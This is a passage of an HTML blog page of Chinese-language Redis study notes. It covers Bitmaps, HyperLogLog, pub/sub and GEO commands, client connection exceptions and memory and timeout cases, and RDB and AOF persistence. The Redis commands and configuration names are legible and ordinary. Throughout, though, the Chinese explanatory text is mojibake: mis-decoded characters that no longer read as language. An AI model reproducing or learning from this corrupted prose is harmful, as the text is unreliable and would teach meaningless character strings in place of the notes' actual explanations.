key [start][end]</code></td><td>è·å–BitmapsæŒ‡å®šèŒƒå›´å€¼ä¸º1çš„ä¸ªæ•°</td><td></td></tr><tr><td><code>bitop operator destkey key[key....]</code></td><td>Bitmapsé—´çš„è¿ç®—</td><td><code>bitop</code>æ˜¯ä¸€ä¸ªå¤åˆæ“ä½œï¼Œå®ƒå¯ä»¥åšå¤šä¸ªBitmapsçš„<code>and</code>ã€<code>or</code>ã€<code>not</code>ã€<code>xor</code>æ“ä½œå¹¶å°†ç»“æœä¿å­˜åœ¨<code>destkey</code>ä¸­</td></tr><tr><td><code>bitpos key targetBit [start] [end]</code></td><td>è®¡ç®—Bitmapsä¸­ç¬¬ä¸€ä¸ªå€¼ä¸ºtargetBitçš„åç§»é‡</td><td></td></tr></tbody></table><p>å½“ç”¨æˆ·é‡å¾ˆå¤§æ—¶ï¼Œä½¿ç”¨ bitmaps å­˜å‚¨ç”¨æˆ·çš„æ´»è·ƒæƒ…å†µæ˜¯éå¸¸å¥½çš„ä¸€ç§æ–¹æ¡ˆï¼Œä½†æ´»è·ƒç”¨æˆ·é‡è¾ƒå°‘æ—¶åˆ™ä¸åˆç†ï¼Œå¤§å¤šæ•°ä½éƒ½æ˜¯ 0ã€‚</p><h2 id="HyperLogLog"><a href="#HyperLogLog" class="headerlink" title="HyperLogLog"></a>HyperLogLog</h2><p>HyperLogLogå¹¶ä¸æ˜¯ä¸€ç§æ–°çš„æ•°æ®ç»“æ„ï¼ˆå®é™…ç±»å‹ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼‰ï¼Œé€šè¿‡HyperLogLogå¯ä»¥åˆ©ç”¨æå°çš„å†…å­˜ç©ºé—´å®Œæˆç‹¬ç«‹æ€»æ•°çš„ç»Ÿè®¡ï¼Œæ•°æ®é›†å¯ä»¥æ˜¯IPã€Emailã€IDç­‰ã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>pfadd key element [element â€¦]</code></td><td>æ·»åŠ ï¼ŒæˆåŠŸè¿”å› 1</td><td></td></tr><tr><td><code>pfcount key [key â€¦]</code></td><td>è®¡ç®—ç‹¬ç«‹ç”¨æˆ·</td><td></td></tr><tr><td><code>pfmerge destkey sourcekey [sourcekey ...]</code></td><td>åˆå¹¶</td><td></td></tr></tbody></table><p>ç›¸æ¯”äºé›†åˆç±»å‹ï¼ŒHyperLogLog å†…å­˜å ç”¨é‡éå¸¸å°ï¼Œä½†æ˜¯å­˜åœ¨é”™è¯¯ç‡ï¼Œå› æ­¤ï¼Œåœ¨æ•°æ®ç»“æ„é€‰å‹æ—¶ï¼Œéœ€è¦å¹³è¡¡è¯¯å·®ä¸ç©ºé—´å ç”¨ç‡ã€‚</p><h2 id="å‘å¸ƒè®¢é˜…"><a href="#å‘å¸ƒè®¢é˜…" class="headerlink" title="å‘å¸ƒè®¢é˜…"></a>å‘å¸ƒè®¢é˜…</h2><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>publish channel message</code></td><td>å‘å¸ƒæ¶ˆæ¯ï¼Œè¿”å›è®¢é˜…è€…ä¸ªæ•°</td><td></td></tr><tr><td><code>subscribe channel [channel ...]</code></td><td>è®¢é˜…æ¶ˆæ¯</td><td>å®¢æˆ·ç«¯åœ¨æ‰§è¡Œè®¢é˜…å‘½ä»¤ä¹‹åè¿›å…¥äº†è®¢é˜…çŠ¶æ€ï¼Œåªèƒ½æ¥æ”¶<code>subscribe</code>ã€<code>psubscribe</code>ã€<code>unsubscribe</code>ã€<code>punsubscribe</code>çš„å››ä¸ªå‘½ä»¤<br>æ–°å¼€å¯çš„è®¢é˜…å®¢æˆ·ç«¯ï¼Œæ— æ³•æ”¶åˆ°è¯¥é¢‘é“ä¹‹å‰çš„æ¶ˆæ¯ï¼Œå› ä¸ºRedisä¸ä¼šå¯¹å‘å¸ƒçš„æ¶ˆæ¯è¿›è¡ŒæŒä¹…åŒ–</td></tr><tr><td><code>unsubscribe [channel [channel ...]]</code></td><td>å–æ¶ˆè®¢é˜…</td><td></td></tr><tr><td><code>psubscribe pattern [pattern...]</code><br><code>punsubscribe [pattern [pattern ...]]</code></td><td>æŒ‰ç…§æ¨¡å¼è®¢é˜…å’Œå–æ¶ˆè®¢é˜…</td><td></td></tr><tr><td><code>pubsub channels [pattern]</code></td><td>æŸ¥çœ‹æ´»è·ƒçš„é¢‘é“</td><td></td></tr><tr><td><code>pubsub numsub [channel ...]</code></td><td>æŸ¥çœ‹é¢‘é“è®¢é˜…æ•°</td><td></td></tr><tr><td><code>pubsub numpat</code></td><td>æŸ¥çœ‹æ¨¡å¼è®¢é˜…æ•°</td><td></td></tr></tbody></table><h2 id="GEO"><a href="#GEO" class="headerlink" title="GEO"></a>GEO</h2><p>GEOåº•å±‚ç”± zset å®ç°ã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>geoadd key longitude latitude member [longitude latitude member ...]</code></td><td>å¢åŠ åœ°ç†ä½ç½®ä¿¡æ¯ã€‚è¿”å›æˆåŠŸæ·»åŠ çš„ä¸ªæ•°</td><td>æ›´æ–°åœ°ç†ä½ç½®ä¿¡æ¯ä»ç„¶å¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œä½†è¿”å›ä¸º 0ã€‚è¯¥å‘½ä»¤åŒæ—¶æ”¯æŒå¤šä¸ªåœ°ç†ä½ç½®æ·»åŠ </td></tr><tr><td><code>geopos key member [member ...]</code></td><td>è·å–åœ°ç†ä½ç½®ä¿¡æ¯</td><td></td></tr><tr><td><code>geodist key member1 member2 [unit]</code></td><td>è·å–ä¸¤ä¸ªåœ°ç†ä½ç½®çš„è·ç¦»</td><td><code>unit</code>ä¸ºå•ä½ï¼Œåˆ†åˆ«ä¸º<code>m</code>(ç±³)ï¼Œ<code>km</code>(å…¬é‡Œ)ï¼Œ<code>mi</code>(è‹±é‡Œ)ï¼Œ<code>ft</code>(å°º)</td></tr><tr><td><code>georadius key longitude latitude radiusm|km|ft|mi [withcoord] [withdist] [withhash] [COUNT count] [asc|desc] [store key] [storedist key]</code><br><br><code>georadiusbymember key member radiusm|km|ft|mi [withcoord] [withdist] [withhash] [COUNT count] [asc|desc] [store key] [storedist key]</code></td><td>è·å–æŒ‡å®šä½ç½®èŒƒå›´å†…çš„åœ°ç†ä¿¡æ¯ä½ç½®é›†åˆ</td><td><code>georadius</code>å’Œ<code>georadiusbymember</code>ä¸¤ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä»¥ä¸€ä¸ªåœ°ç†ä½ç½®ä¸ºä¸­å¿ƒç®—å‡ºæŒ‡å®šåŠå¾„å†…çš„å…¶ä»–åœ°ç†ä¿¡æ¯ä½ç½®ï¼Œä¸åŒçš„æ˜¯<code>georadius</code>å‘½ä»¤çš„ä¸­å¿ƒä½ç½®ç»™å‡ºäº†å…·ä½“çš„ç»çº¬åº¦ï¼Œ<code>georadiusbymember</code>åªéœ€ç»™å‡ºæˆå‘˜å³å¯ã€‚å…¶ä¸­<code>radiusm|km|ft|mi</code>æ˜¯å¿…éœ€å‚æ•°ï¼ŒæŒ‡å®šäº†åŠå¾„<br><code>withcoord</code>:è¿”å›ç»çº¬åº¦ï¼›<br><code>withdist</code>:è¿”å›ç¦»ä¸­å¿ƒèŠ‚ç‚¹ä½ç½®çš„è·ç¦»ï¼›<br><code>withhash</code>:è¿”å›<code>geohash</code>ï¼›<br><code>COUNT count</code>:è¿”å›æŒ‡å®šç»“æœæ•°é‡ï¼›<br><code>asc|desc</code>:æŒ‰è·ä¸­å¿ƒèŠ‚ç‚¹è·ç¦»å‡åºæˆ–é™åºï¼›<br><code>store key</code>:å°†ç»“æœä¿å­˜åˆ°æŒ‡å®šé”®ï¼›<br><code>storedist key</code>:å°†è·ä¸­å¿ƒèŠ‚ç‚¹è·ç¦»ä¿å­˜åˆ°æŒ‡å®šé”®</td></tr><tr><td><code>geohash key member [member ...]</code></td><td>è·å–geohash</td><td>Rediså°†æ‰€æœ‰åœ°ç†ä½ç½®ä¿¡æ¯çš„<code>geohash</code>å­˜æ”¾åœ¨<code>zset</code>ä¸­ï¼Œå­—ç¬¦ä¸²è¶Šé•¿ï¼Œè¡¨ç¤ºçš„ä½ç½®æ›´ç²¾ç¡®</td></tr><tr><td><code>zrem key member</code></td><td>åˆ é™¤åœ°ç†ä½ç½®ä¿¡æ¯</td><td></td></tr></tbody></table><h1 id="ç¬¬-4-ç« -å®¢æˆ·ç«¯"><a href="#ç¬¬-4-ç« -å®¢æˆ·ç«¯" class="headerlink" title="ç¬¬ 4 ç«  å®¢æˆ·ç«¯"></a>ç¬¬ 4 ç«  å®¢æˆ·ç«¯</h1><h2 id="å®¢æˆ·ç«¯å¸¸è§å¼‚å¸¸"><a href="#å®¢æˆ·ç«¯å¸¸è§å¼‚å¸¸" class="headerlink" title="å®¢æˆ·ç«¯å¸¸è§å¼‚å¸¸"></a>å®¢æˆ·ç«¯å¸¸è§å¼‚å¸¸</h2><ol><li>æ— æ³•ä»è¿æ¥æ± è·å–åˆ°è¿æ¥<ol><li>è¿æ¥æ± è®¾ç½®è¿‡å°ï¼Œé»˜è®¤ä¸º 8</li><li>å®¢æˆ·ç«¯æœªæ­£ç¡®ä½¿ç”¨è¿æ¥æ± ï¼Œå¦‚æ²¡æœ‰è¿›è¡Œé‡Šæ”¾</li><li>å­˜åœ¨æ…¢æŸ¥è¯¢æ“ä½œ</li><li>Redis æœåŠ¡é€ æˆå‘½ä»¤æ‰§è¡Œè¿‡ç¨‹é˜»å¡</li></ol></li><li>å®¢æˆ·ç«¯è¯»å†™è¶…æ—¶<ol><li>è¯»å†™æ—¶é—´è®¾ç½®è¿‡çŸ­</li><li>å‘½ä»¤æ‰§è¡Œæ—¶é—´è¾ƒé•¿</li><li>ç½‘è·¯å¼‚å¸¸</li><li>Redis è‡ªèº«å‘ç”Ÿé˜»å¡</li></ol></li><li>å®¢æˆ·ç«¯è¿æ¥è¶…æ—¶<ol><li>è¶…æ—¶æ—¶é—´è¿‡çŸ­</li><li>Redis å‘ç”Ÿé˜»å¡ï¼Œ<code>tcp-backlog</code>å·²æ»¡ï¼Œé€ æˆæ–°çš„è¿æ¥å¤±è´¥</li><li>ç½‘ç»œå¼‚å¸¸</li></ol></li><li>å®¢æˆ·ç«¯ç¼“å†²åŒºå¼‚å¸¸<ol><li>è¾“å‡ºç¼“å†²åŒºæ»¡</li><li>é•¿æ—¶é—´é—²ç½®è¿æ¥è¢«æœåŠ¡ç«¯ä¸»åŠ¨æ–­å¼€</li><li>ä¸æ­£å¸¸å¹¶å‘è¯»å†™</li></ol></li><li>Lua è„šæœ¬æ­£åœ¨æ‰§è¡Œ<ol><li>è„šæœ¬æ­£åœ¨æ‰§è¡Œï¼Œä¸”æ‰§è¡Œæ—¶é—´è¶…è¿‡äº†<code>lua-time-limit</code>ï¼Œéœ€ç­‰å¾…è„šæœ¬æ‰§è¡Œå®Œæˆï¼Œæˆ–è€…ä½¿ç”¨<code>shutdown save</code>å…³é—­ Redis æœåŠ¡</li></ol></li><li>Redis æ­£åœ¨åŠ è½½æŒä¹…åŒ–æ–‡ä»¶</li><li>Redis ä½¿ç”¨çš„å†…å­˜è¶…è¿‡<code>maxmemory</code>é…ç½®</li><li>å®¢æˆ·ç«¯è¿æ¥æ•°è¿‡å¤§<ol><li>å®¢æˆ·ç«¯ï¼šå¦‚æœ<code>maxclients</code>å‚æ•°ä¸æ˜¯å¾ˆå°çš„è¯ï¼Œåº”ç”¨æ–¹çš„å®¢æˆ·ç«¯è¿æ¥æ•°åŸºæœ¬ä¸ä¼šè¶…è¿‡<code>maxclients</code>ï¼Œé€šå¸¸æ¥çœ‹æ˜¯ç”±äºåº”ç”¨æ–¹å¯¹äºRediså®¢æˆ·ç«¯ä½¿ç”¨ä¸å½“é€ æˆçš„ã€‚æ­¤æ—¶å¦‚æœåº”ç”¨æ–¹æ˜¯åˆ†å¸ƒå¼ç»“æ„çš„è¯ï¼Œå¯ä»¥é€šè¿‡ä¸‹çº¿éƒ¨åˆ†åº”ç”¨èŠ‚ç‚¹ï¼ˆä¾‹å¦‚å ç”¨è¿æ¥è¾ƒå¤šçš„èŠ‚ç‚¹ï¼‰ï¼Œä½¿å¾—Redisçš„è¿æ¥æ•°å…ˆé™ä¸‹æ¥ã€‚ä»è€Œè®©ç»å¤§éƒ¨åˆ†èŠ‚ç‚¹å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œæ­¤æ—¶å†é€šè¿‡æŸ¥æ‰¾ç¨‹åºbugæˆ–è€…è°ƒæ•´<code>maxclients</code>è¿›è¡Œé—®é¢˜çš„ä¿®å¤ã€‚</li><li>æœåŠ¡ç«¯ï¼šå¦‚æœæ­¤æ—¶å®¢æˆ·ç«¯æ— æ³•å¤„ç†ï¼Œè€Œå½“å‰Redisä¸ºé«˜å¯ç”¨æ¨¡å¼ï¼ˆä¾‹å¦‚Redis Sentinelå’ŒRedis Clusterï¼‰ï¼Œå¯ä»¥è€ƒè™‘å°†å½“å‰Redisåšæ•…éšœè½¬ç§»ã€‚</li></ol></li></ol><h2 id="å®¢æˆ·ç«¯æ¡ˆä¾‹åˆ†æ"><a href="#å®¢æˆ·ç«¯æ¡ˆä¾‹åˆ†æ" class="headerlink" title="å®¢æˆ·ç«¯æ¡ˆä¾‹åˆ†æ"></a>å®¢æˆ·ç«¯æ¡ˆä¾‹åˆ†æ</h2><h3 id="Rediså†…å­˜é™¡å¢"><a href="#Rediså†…å­˜é™¡å¢" class="headerlink" title="Rediså†…å­˜é™¡å¢"></a>Rediså†…å­˜é™¡å¢</h3><h4 id="ç°è±¡"><a href="#ç°è±¡" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h4><p>æœåŠ¡ç«¯ç°è±¡ï¼šRedisä¸»èŠ‚ç‚¹å†…å­˜é™¡å¢ï¼Œå‡ ä¹ç”¨æ»¡<code>maxmemory</code>ï¼Œè€Œä»èŠ‚ç‚¹å†…å­˜å¹¶æ²¡æœ‰å˜åŒ–<br>å®¢æˆ·ç«¯ç°è±¡ï¼šå®¢æˆ·ç«¯äº§ç”Ÿäº†OOMå¼‚å¸¸ï¼Œæ— æ³•å†™å…¥æ–°çš„æ•°æ®</p><h4 id="åˆ†æåŸå› "><a href="#åˆ†æåŸå› " class="headerlink" title="åˆ†æåŸå› "></a>åˆ†æåŸå› </h4><p>ä»ç°è±¡çœ‹ï¼Œå¯èƒ½çš„åŸå› æœ‰ä¸¤ä¸ª</p><ol><li>ç¡®å®æœ‰å¤§é‡å†™å…¥ï¼Œä½†æ˜¯ä¸»ä»å¤åˆ¶å‡ºç°é—®é¢˜ï¼šç”¨<code>dbsize</code>æŸ¥è¯¢Rediså¤åˆ¶çš„ç›¸å…³ä¿¡æ¯ï¼Œå¤åˆ¶æ˜¯æ­£å¸¸çš„ï¼Œä¸»ä»æ•°æ®åŸºæœ¬ä¸€è‡´ã€‚</li><li>å…¶ä»–åŸå› é€ æˆä¸»èŠ‚ç‚¹å†…å­˜ä½¿ç”¨è¿‡å¤§ï¼šæ’æŸ¥æ˜¯å¦ç”±å®¢æˆ·ç«¯ç¼“å†²åŒºé€ æˆä¸»èŠ‚ç‚¹å†…å­˜é™¡å¢ï¼Œä½¿ç”¨<code>info clients</code>å‘½ä»¤æŸ¥è¯¢ï¼Œå‘ç°è¾“å‡ºç¼“å†²åŒºä¸å¤ªæ­£å¸¸ï¼Œè¿›ä¸€æ­¥é€šè¿‡<code>client list</code>å‘½ä»¤æ‰¾åˆ°<code>omem</code>ä¸æ­£å¸¸çš„è¿æ¥ï¼Œä¸€èˆ¬æ¥è¯´å¤§éƒ¨åˆ†å®¢æˆ·ç«¯çš„<code>omem</code>ä¸º0ï¼ˆå› ä¸ºå¤„ç†é€Ÿåº¦ä¼šè¶³å¤Ÿå¿«ï¼‰ï¼Œäºæ˜¯é€šè¿‡<code>redis-cli client list | grep -v &quot;omem=0&quot;</code>æ‰¾åˆ°<code>omem</code>éé›¶çš„å®¢æˆ·ç«¯è¿æ¥ã€‚</li></ol><h3 id="å®¢æˆ·ç«¯å‘¨æœŸæ€§çš„è¶…æ—¶"><a href="#å®¢æˆ·ç«¯å‘¨æœŸæ€§çš„è¶…æ—¶" class="headerlink" title="å®¢æˆ·ç«¯å‘¨æœŸæ€§çš„è¶…æ—¶"></a>å®¢æˆ·ç«¯å‘¨æœŸæ€§çš„è¶…æ—¶</h3><h4 id="ç°è±¡-1"><a href="#ç°è±¡-1" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h4><p>å®¢æˆ·ç«¯ç°è±¡ï¼šå®¢æˆ·ç«¯å‡ºç°å¤§é‡å‘¨æœŸæ€§è¶…æ—¶<br>æœåŠ¡ç«¯ç°è±¡ï¼šæœåŠ¡ç«¯å¹¶æ²¡æœ‰æ˜æ˜¾çš„å¼‚å¸¸ï¼Œåªæ˜¯æœ‰ä¸€äº›æ…¢æŸ¥è¯¢æ“ä½œ</p><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><ul><li>ç½‘ç»œï¼šæŸ¥çœ‹ç½‘ç»œè¿æ¥æ­£å¸¸</li><li>Redisï¼šæŸ¥çœ‹ Redis æ—¥å¿—ç»Ÿè®¡ï¼Œæœªå‘ç°å¼‚å¸¸</li><li>å®¢æˆ·ç«¯ï¼šæ…¢æŸ¥è¯¢ä¸è¶…æ—¶å‘ç”Ÿæ—¶é—´ç‚¹å»åˆï¼Œæ¨æ–­ç”±æ…¢æŸ¥è¯¢å¼•èµ·</li></ul><h1 id="ç¬¬-5-ç« -æŒä¹…åŒ–"><a href="#ç¬¬-5-ç« -æŒä¹…åŒ–" class="headerlink" title="ç¬¬ 5 ç«  æŒä¹…åŒ–"></a>ç¬¬ 5 ç«  æŒä¹…åŒ–</h1><h2 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h2><ul><li><code>save</code>å‘½ä»¤ï¼šé˜»å¡å½“å‰RedisæœåŠ¡å™¨ï¼Œç›´åˆ°RDBè¿‡ç¨‹å®Œæˆä¸ºæ­¢ï¼Œå¯¹äºå†…å­˜æ¯”è¾ƒå¤§çš„å®ä¾‹ä¼šé€ æˆé•¿æ—¶é—´é˜»å¡ï¼Œçº¿ä¸Šç¯å¢ƒä¸å»ºè®®ä½¿ç”¨ã€‚</li><li><code>bgsave</code>å‘½ä»¤ï¼šRedisè¿›ç¨‹æ‰§è¡Œforkæ“ä½œåˆ›å»ºå­è¿›ç¨‹ï¼ŒRDBæŒä¹…åŒ–è¿‡ç¨‹ç”±å­è¿›ç¨‹è´Ÿè´£ï¼Œå®Œæˆåè‡ªåŠ¨ç»“æŸã€‚é˜»å¡åªå‘ç”Ÿåœ¨forké˜¶æ®µï¼Œä¸€èˆ¬æ—¶é—´å¾ˆçŸ­ã€‚</li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8tfeooj3zj30k60hptbk.jpg" alt="bgsave workflow"></p><p>è‡ªåŠ¨è§¦å‘åœºæ™¯ï¼š</p><ol><li>ä½¿ç”¨saveç›¸å…³é…ç½®ï¼Œå¦‚<code>save m n</code>ã€‚è¡¨ç¤º m ç§’å†…æ•°æ®é›†å­˜åœ¨ n æ¬¡ä¿®æ”¹æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ bgsave</li><li>å¦‚æœä»èŠ‚ç‚¹æ‰§è¡Œå…¨é‡å¤åˆ¶æ“ä½œï¼Œä¸»èŠ‚ç‚¹è‡ªåŠ¨æ‰§è¡Œ bgsave ç”ŸæˆRDBæ–‡ä»¶å¹¶å‘é€ç»™ä»èŠ‚ç‚¹</li><li>æ‰§è¡Œ<code>debug reload</code>å‘½ä»¤é‡æ–°åŠ è½½Redisæ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨è§¦å‘ save æ“ä½œ</li><li>é»˜è®¤æƒ…å†µä¸‹æ‰§è¡Œ<code>shutdown</code>å‘½ä»¤æ—¶ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ AOF æŒä¹…åŒ–åŠŸèƒ½åˆ™è‡ªåŠ¨æ‰§è¡Œ bgsave</li></ol><p>å¦‚æœRedisåŠ è½½æŸåçš„RDBæ–‡ä»¶æ—¶æ‹’ç»å¯åŠ¨ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨Redisæä¾›çš„<code>redis-check-dump</code>å·¥å…·æ£€æµ‹ RDB æ–‡ä»¶å¹¶è·å–å¯¹åº”çš„é”™è¯¯æŠ¥å‘Šã€‚</p><h3 id="RDB-çš„ä¼˜ç¼ºç‚¹"><a href="#RDB-çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="RDB çš„ä¼˜ç¼ºç‚¹"></a>RDB çš„ä¼˜ç¼ºç‚¹</h3><p>RDBçš„ä¼˜ç‚¹ï¼š</p><ul><li>RDBæ˜¯ä¸€ä¸ªç´§å‡‘å‹ç¼©çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»£è¡¨Redisåœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„æ•°æ®å¿«ç…§ã€‚<strong>éå¸¸é€‚ç”¨äºå¤‡ä»½ï¼Œå…¨é‡å¤åˆ¶ç­‰åœºæ™¯</strong>ã€‚æ¯”å¦‚æ¯6å°æ—¶æ‰§è¡Œbgsaveå¤‡ä»½ï¼Œå¹¶æŠŠRDBæ–‡ä»¶æ‹·è´åˆ°è¿œç¨‹æœºå™¨æˆ–è€…æ–‡ä»¶ç³»ç»Ÿä¸­ï¼ˆå¦‚hdfsï¼‰ï¼Œç”¨äºç¾éš¾æ¢å¤ã€‚</li><li>RedisåŠ è½½RDBæ¢å¤æ•°æ®è¿œè¿œå¿«äºAOFçš„æ–¹å¼ã€‚</li></ul><p>RDBçš„ç¼ºç‚¹ï¼š</p><ul><li>RDBæ–¹å¼æ•°æ®<strong>æ— æ³•åšåˆ°å®æ—¶æŒä¹…åŒ–/ç§’çº§æŒä¹…åŒ–</strong>ã€‚å› ä¸ºbgsaveæ¯æ¬¡è¿è¡Œéƒ½è¦æ‰§è¡Œforkæ“ä½œåˆ›å»ºå­è¿›ç¨‹ï¼Œå±äºé‡é‡çº§æ“ä½œï¼Œé¢‘ç¹æ‰§è¡Œæˆæœ¬è¿‡é«˜ã€‚</li><li>RDBæ–‡ä»¶ä½¿ç”¨ç‰¹å®šäºŒè¿›åˆ¶æ ¼å¼ä¿å­˜ï¼ŒRedisç‰ˆæœ¬æ¼”è¿›è¿‡ç¨‹ä¸­æœ‰å¤šä¸ªæ ¼å¼çš„RDBç‰ˆæœ¬ï¼Œå­˜åœ¨è€ç‰ˆæœ¬RedisæœåŠ¡æ— æ³•å…¼å®¹æ–°ç‰ˆRDBæ ¼å¼çš„é—®é¢˜ã€‚</li></ul><h2 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h2><p>AOFï¼ˆappend only fileï¼‰æŒä¹…åŒ–ï¼šä»¥ç‹¬ç«‹æ—¥å¿—çš„æ–¹å¼è®°å½•æ¯æ¬¡å†™å‘½ä»¤(ç±»ä¼¼äº MySQL çš„ Binlog)ï¼Œé‡å¯æ—¶å†é‡æ–°æ‰§è¡ŒAOFæ–‡ä»¶ä¸­çš„å‘½ä»¤è¾¾åˆ°æ¢å¤æ•°æ®çš„ç›®çš„ã€‚ç›®å‰å·²ç»æ˜¯RedisæŒä¹…åŒ–çš„ä¸»æµæ–¹å¼ã€‚</p><p>å¼€å¯AOFåŠŸèƒ½éœ€è¦è®¾ç½®é…ç½®ï¼š<code>appendonly yes</code>ï¼Œé»˜è®¤ä¸å¼€å¯ã€‚AOFæ–‡ä»¶åé€šè¿‡<code>appendfilename</code>é…ç½®è®¾ç½®ï¼Œé»˜è®¤æ–‡ä»¶åæ˜¯<code>appendonly.aof</code>ã€‚ä¿å­˜è·¯å¾„åŒ RDB æŒä¹…åŒ–æ–¹å¼ä¸€è‡´ï¼Œé€šè¿‡<code>dir</code>é…ç½®æŒ‡å®šã€‚<br><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8u1rzsipij30n811un3c.jpg" alt="AOF workflow"></p><p>AOFç¼“å†²åŒºåŒæ­¥æ–‡ä»¶ç­–ç•¥(å‚æ•°<code>appendfsync</code>)</p><table><thead><tr><th>å¯é…ç½®å€¼</th><th>è¯´æ˜</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>always</code></td><td>å‘½ä»¤å†™å…¥<code>aof_buf</code>åè°ƒç”¨ç³»ç»Ÿ<code>fsync</code>æ“ä½œåŒæ­¥åˆ° AOF æ–‡ä»¶ï¼Œ<code>fsync</code> å®Œæˆåçº¿ç¨‹è¿”å›</td><td>ä¸å»ºè®®</td></tr><tr><td><code>everysec</code></td><td>å‘½ä»¤å†™å…¥<code>aof_buf</code>åè°ƒç”¨ç³»ç»Ÿ<code>write</code>æ“ä½œï¼Œ<code>write</code>å®Œæˆåçº¿ç¨‹è¿”å›ã€‚<code>fsync</code>åŒæ­¥æ–‡ä»¶æ“ä½œç”±ä¸“é—¨çº¿ç¨‹æ¯ç§’è°ƒç”¨ä¸€æ¬¡ã€‚</td><td>å»ºè®®ï¼Œä¸ºé»˜è®¤é€‰é¡¹</td></tr><tr><td><code>no</code></td><td>å‘½ä»¤å†™å…¥<code>aof_buf</code>åè°ƒç”¨ç³»ç»Ÿ<code>write</code>æ“ä½œï¼Œä¸å¯¹ AOF æ–‡ä»¶åš<code>fsync</code>åŒæ­¥ï¼ŒåŒæ­¥ç¡¬ç›˜æ“ä½œç”± OS è´Ÿè´£ï¼Œé€šå¸¸åŒæ­¥å‘¨æœŸæœ€é•¿ 30s</td><td>æ•°æ®å®‰å…¨æ— æ³•å¾—åˆ°ä¿è¯</td></tr></tbody></table><p>aof é‡å†™è¿‡ç¨‹å¯é€šè¿‡æ‰‹åŠ¨ä¸è‡ªåŠ¨æ–¹å¼è§¦å‘ã€‚æ‰‹åŠ¨é€šè¿‡ç›´æ¥è°ƒç”¨<code>bgrewriteaof</code>å‘½ä»¤ï¼Œè‡ªåŠ¨æ–¹å¼åˆ™æ ¹æ®<code>auto-aof-rewrite-min-size</code>å’Œ<code>auto-aof-rewrite-percentage</code>çš„å‚æ•°ç¡®å®šè§¦å‘æ—¶æœºã€‚<br><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8u27kw8tmj30u00ws7ff.jpg" alt="AOF rewrite workflow"></p><h2 id="é‡å¯åŠ è½½"><a href="#é‡å¯åŠ è½½" class="headerlink" title="é‡å¯åŠ è½½"></a>é‡å¯åŠ è½½</h2><p>Redis å¯åŠ¨æ—¶ä¼šä¼˜å…ˆåŠ è½½ AOF æ–‡ä»¶ï¼Œå¦‚æœ AOF ä¸å¯åŠ è½½ï¼Œç„¶åå†åŠ è½½ RDB æ–‡ä»¶ã€‚å…¶æ–‡ä»¶åŠ è½½æµç¨‹å¦‚ä¸‹ï¼š<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g91c1tnqngj30ky0m3djy.jpg" alt=""></p><p>å¦‚æœåœ¨åŠ è½½ AOF æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼Œå¯ä»¥å…ˆè¿›è¡Œå¤‡ä»½ï¼Œç„¶åé‡‡ç”¨<code>redis-check-aof --fix</code>å‘½ä»¤è¿›è¡Œä¿®å¤ï¼Œä¿®å¤åä½¿ç”¨<code>diff -u</code>å¯¹æ¯”æ•°æ®çš„å·®å¼‚ï¼Œæ‰¾å‡ºä¸¢å¤±çš„æ•°æ®ï¼Œæœ‰äº›å¯ä»¥äººå·¥ä¿®æ”¹è¡¥å…¨ã€‚</p><p>AOFæ–‡ä»¶å¯èƒ½å­˜åœ¨ç»“å°¾ä¸å®Œæ•´çš„æƒ…å†µï¼Œæ¯”å¦‚æœºå™¨çªç„¶æ‰ç”µå¯¼è‡´AOFå°¾éƒ¨æ–‡ä»¶å‘½ä»¤å†™å…¥ä¸å…¨ã€‚Redisä¸ºæˆ‘ä»¬æä¾›äº†<code>aof-load-truncated</code>é…ç½®æ¥å…¼å®¹è¿™ç§æƒ…å†µï¼Œé»˜è®¤å¼€å¯ã€‚åŠ è½½AOFæ—¶ï¼Œå½“é‡åˆ°æ­¤é—®é¢˜æ—¶ä¼šå¿½ç•¥å¹¶ç»§ç»­å¯åŠ¨ï¼ŒåŒæ—¶æ‰“å°å¦‚ä¸‹è­¦å‘Šæ—¥å¿—ï¼š</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># !!! Warning: short read while loading the AOF file !!!</span><br><span class="line"># !!! Truncating the AOF at offset <span class="number">397856725</span> !!!</span><br><span class="line"># AOF loaded anyway because aof-load-truncated is enabled</span><br></pre></td></tr></table></figure><h2 id="é—®é¢˜å®šä½ä¸ä¼˜åŒ–"><a href="#é—®é¢˜å®šä½ä¸ä¼˜åŒ–" class="headerlink" title="é—®é¢˜å®šä½ä¸ä¼˜åŒ–"></a>é—®é¢˜å®šä½ä¸ä¼˜åŒ–</h2><h3 id="fork-æ“ä½œ"><a href="#fork-æ“ä½œ" class="headerlink" title="fork æ“ä½œ"></a>fork æ“ä½œ</h3><p>å½“ Redis åš RDB æˆ– AOF é‡å†™æ—¶ï¼Œå¯¹äºå¤§å¤šæ•°æ“ä½œç³»ç»Ÿæ¥è¯´ 